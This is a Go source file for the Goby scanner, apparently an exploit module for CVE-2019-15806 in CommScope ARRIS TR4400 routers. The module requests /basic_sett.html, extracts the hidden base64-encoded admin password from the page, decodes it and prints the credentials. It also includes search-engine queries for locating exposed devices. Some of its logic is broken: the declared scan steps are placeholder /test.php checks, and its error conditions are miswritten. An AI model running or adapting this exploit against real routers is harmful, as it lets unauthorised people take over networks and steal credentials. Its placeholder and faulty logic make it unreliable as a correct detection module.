package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "CommScope ARRIS TR4400 Wireless Router basic_sett.html Information Disclosure Vulnerability (CVE-2019-15806)",
    "Description": "<p>CommScope ARRIS TR4400 is a wireless router made by CommScope.</p><p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Product": "ARRIS-TR4400",
    "Homepage": "https://www.commscope.com/",
    "DisclosureDate": "2019-08-29",
    "Author": "h1ei1",
    "FofaQuery": "body=\"base64encode(document.tF.pws.value)\" || body=\"ARRIS TR3300\"",
    "GobyQuery": "body=\"base64encode(document.tF.pws.value)\" || body=\"ARRIS TR3300\"",
    "Level": "3",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.commscope.com.\">https://www.commscope.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://medium.com/@v.roberthoutenbrink/commscope-vulnerability-authentication-bypass-in-arris-tr4400-firmware-version-a1-00-004-180301-4a90aa8e7570"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "password,all",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2019-15806"
    ],
    "CNNVD": [
        "CNNVD-201908-2219"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "CommScope ARRIS TR4400 无线路由器 basic_sett.html 信息泄露漏洞（CVE-2019-15806）",
            "Product": "ARRIS-TR4400",
            "Description": "<p>CommScope ARRIS TR4400是美国康普（CommScope）公司的一款无线路由器。<br></p><p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.commscope.com\">https://www.commscope.com</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "CommScope ARRIS TR4400 Wireless Router basic_sett.html Information Disclosure Vulnerability (CVE-2019-15806)",
            "Product": "ARRIS-TR4400",
            "Description": "<p>CommScope ARRIS TR4400 is a wireless router made by CommScope.<br></p><p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"https://www.commscope.com.\">https://www.commscope.com</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-26",
    "PocId": "10840"
}`

	sendPayload155dfsg5 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/basic_sett.html")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, sendConfig)
		if err != nil {
			return resp, err
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayload155dfsg5(hostInfo)
			if err != nil && resp.StatusCode != 200 && !strings.Contains(resp.RawBody, "<input type=\"hidden\" name=\"cur_passwd\" value=\"") {
				return false
			}
			curPasswd := regexp.MustCompile("<input type=\"hidden\" name=\"cur_passwd\" value=\"(.*?)\">").FindStringSubmatch(resp.RawBody)
			if len(curPasswd) > 1 && curPasswd[1] != "" {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			var resp *httpclient.HttpResponse
			var err error
			if attackType == "all" || attackType == "password" {
				resp, err = sendPayload155dfsg5(expResult.HostInfo)
			} else {
				expResult.Output = "未知的利用方式"
				return expResult
			}
			if err != nil && resp.StatusCode != 200 && !strings.Contains(resp.RawBody, "<input type=\"hidden\" name=\"cur_passwd\" value=\"") {
				expResult.Output = "利用失败,不存在该漏洞"
				return expResult
			}
			if attackType == "all" {
				expResult.Output = resp.RawBody
			} else if attackType == "password" {
				curPasswd := regexp.MustCompile("<input type=\"hidden\" name=\"cur_passwd\" value=\"(.*?)\">").FindStringSubmatch(resp.RawBody)
				if len(curPasswd) < 1 {
					expResult.Output = "漏洞利用失败"
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				base64DecPass, _ := base64.StdEncoding.DecodeString(curPasswd[1])
				expResult.Output += "username: admin\n"
				expResult.Output += "password: " + string(base64DecPass)
			}
			return expResult
		},
	))
}
